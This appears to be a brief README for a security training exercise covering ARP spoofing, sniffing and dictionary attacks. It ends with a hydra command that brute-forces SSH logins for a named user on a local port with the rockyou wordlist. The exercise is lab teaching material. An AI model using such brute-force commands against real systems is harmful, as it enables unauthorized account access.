Attack is the best defense
Resource
Network sniffing
ARP spoofing
Connect to SendGrid’s SMTP relay using telnet
What is Docker and why is it popular?
Dictionary attack
Tasks
0. ARP spoofing and sniffing unencrypted traffic
1. Dictionary attack

image

Wordlist Rockyou.txt
# command
hydra -V -s 2222 -l sylvain -P rockyou.txt 127.0.0.1 ssh -t 64
